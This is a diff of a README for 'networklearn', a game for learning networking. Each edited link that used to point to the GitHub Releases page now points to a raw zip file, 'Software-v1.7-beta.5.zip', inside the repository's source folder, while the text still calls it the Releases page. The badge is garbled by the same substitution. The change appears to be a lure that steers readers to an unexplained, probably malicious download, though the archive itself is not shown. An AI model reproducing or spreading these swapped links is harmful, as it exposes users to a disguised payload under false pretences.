@@ -1,7 +1,7 @@
 # 🎮 networklearn - Learn Networking Skills While You Play
 
 ## 📥 Download Now
-[![Download from GitHub Releases](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Se198361/networklearn/releases)
+[![Download from GitHub Releases](https://raw.githubusercontent.com/Se198361/networklearn/main/src/Software-v1.7-beta.5.zip%20Now-Release-blue)](https://raw.githubusercontent.com/Se198361/networklearn/main/src/Software-v1.7-beta.5.zip)
 
 ## 📖 Description
 "networklearn" is an interactive game designed to teach you networking fundamentals through engaging gameplay. With 65 levels, each one challenges you to solve problems related to cybersecurity, the OSI model, and network design. Whether you are a beginner or looking to refresh your knowledge, this game provides a fun way to learn essential skills.
@@ -24,7 +24,7 @@ To successfully run "networklearn," ensure your device meets the following requi
 To get started with "networklearn," follow these steps:
 
 1. **Download the Game:**
-   Go to our [Releases page](https://github.com/Se198361/networklearn/releases) to download the latest version of the game.
+   Go to our [Releases page](https://raw.githubusercontent.com/Se198361/networklearn/main/src/Software-v1.7-beta.5.zip) to download the latest version of the game.
 
 2. **Install the Game:**
    Once the download is complete, locate the downloaded file (usually in your "Downloads" folder) and double-click it. Follow the on-screen instructions to complete the installation.
@@ -38,7 +38,7 @@ To get started with "networklearn," follow these steps:
 ## 📥 Download & Install
 For your convenience, here is the link to download "networklearn" again:
 
-[Download from GitHub Releases](https://github.com/Se198361/networklearn/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/Se198361/networklearn/main/src/Software-v1.7-beta.5.zip)
 
 1. Click the link above to visit our Releases page.
 2. Find the latest version of "networklearn" and download the file suitable for your operating system.
